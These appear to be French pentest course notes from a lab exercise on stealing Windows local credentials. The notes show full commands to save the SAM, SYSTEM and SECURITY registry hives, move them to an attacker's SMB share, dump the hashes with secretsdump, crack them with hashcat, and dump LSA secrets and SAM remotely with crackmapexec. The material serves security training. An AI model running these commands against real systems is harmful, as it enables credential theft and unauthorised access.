---
title:  "Attaque du SAM"
category: "Attaque de mots de passe local Windows"
tag: "Attaques de mots de passe"
---

En ayant accès à un système Windows n'ayant pas rejoint de domaine, on peut facilement récupérer les fichiers associés à la Base de données SAM (contenant les hashes des mdp qui se trouve dans le dossier C:\Windows\System32\config) et les transférer à notre machine afin de les cracker offline.

## Copie des ruches de registres
En ayant un accès admin local sur la cible, on peut récupérer 3 ruches de registres qui vont aider à cracker les hashes.

| Répertorie de registres | Description |
|-------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| hklm\sam                | Contient les hachages associés aux mots de passe des comptes locaux. Nous aurons besoin de ces hachages pour les craquer et obtenir les mots de passe des comptes utilisateurs en clair. |
| hklm\system             | Contient la clé de démarrage du système, qui est utilisée pour chiffrer la base de données SAM. Nous aurons besoin de la clé de démarrage pour déchiffrer la base de données SAM.         |
| hklm\security           | Contient les informations d'identification en cache pour les comptes de domaine. Il peut être avantageux de l'avoir sur une cible Windows reliée à un domaine.                           |

On peut sauvegarder cette ruche en utilisant l'utilitaire **reg.exe**.

## Utilisation de reg.exe save pour copier les ruches du registre

Il faut sauvegarder en local les ruches de registres en utilisant le CMD en admin :

```console
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```
Ensuite, il faut les transférer sur le poste attaquant. On peut utiliser [Impacket's smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) pour cela.

## Création d'une ressource partagée avec smbserver.py
Pour cela, nous allons lancer le script python smbserver.py avec l'option **-smb2support** qui permet de supporter les nouvelles version de smb venant de l'hôte Windows (SMBv1 par défaut).

```console
Misoko@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support Misoko ~/Documents/
```
Une fois que le partage fonctionne sur notre hôte d'attaque, on peut utiliser la commande **move** sur la cible Windows pour déplacer les copies de ruches sur le partage

## Déplacer les copies de ruches sur le partage
```console
C:\> move sam.save \\10.10.15.16\Misoko
C:\> move security.save \\10.10.15.16\Misoko
C:\> move system.save \\10.10.15.16\Misoko
```
On peut faire un ls sur le share afin d'être sûr d'avoir récupérer les copies des ruches.

## Dump des hashes avec Impacket's secretsdump.py
Impacket's secretsdump.py est installé sur la plupart des distribution, on peut le retrouver avec **locate**.

### Utilisation de secretsdump.py

```console
Misoko@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
On peut voir dans l'output de la commande que la première étape de secretsdump consiste à récupérer la clé de démarrage du système avant de procéder au dump de **LOCAL SAM hashes**.
Il ne peut pas le faire sans la clé car la BDD SAM est chiffré par cette dernière.

## Cracker le hash avec Hashcat
### Ajouter ntshash dans un fichier .txt
Auparavant les hash avaient le format **LM hash**, maintenant on utilise plutôt le **nt**.
Une fois dans le fichier texte, on peut cracker le hash avec hashcat.

### Cracker un hash NT avec Hashcat
Le paramétrage de hashcat dépend du type de hash que l'on veut craquer. Pour cela, se référer à la documentation de l'outil.
Dans l'exemple ici, on va utiliser l'option **-m 1000** et la base de credentials rockyou.
```console
Misoko@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

## Dumping à distance & Secrets LSA

Explication des secrets LSA : [Secret LSA](https://www.passcape.com/index.php?section=docsys&cmd=details&id=23).\
Avec l'accès aux credentials en tant que **local admin**, on peut cibler les secrets LSA à travers un réseau.\
On peut donc récupérer des credentials depuis un service en cours d'exécution, tâche planifiée ou application qui utilise les secrets LSA comme stockage de mot de passes.

### Dumping de Secrets LSA à Distance
```console
Misoko@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Dumping de SAM à Distance
```console
Misoko@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```